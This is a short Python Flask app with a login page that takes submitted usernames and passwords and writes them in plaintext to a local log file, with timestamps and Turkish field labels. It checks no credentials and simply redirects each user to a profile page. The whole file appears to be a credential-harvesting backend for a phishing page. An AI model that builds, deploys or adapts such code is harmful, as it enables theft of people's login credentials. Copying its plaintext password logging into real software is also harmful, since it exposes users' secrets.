from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        with open("log.txt", "a") as f:
            f.write(f"[{datetime.now()}] Kullanıcı: {username} | Şifre: {password}\n")
        return redirect(url_for("profile", user=username))
    return render_template("login.html")

@app.route("/profile/<user>")
def profile(user):
    return render_template("profile.html", user=user)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
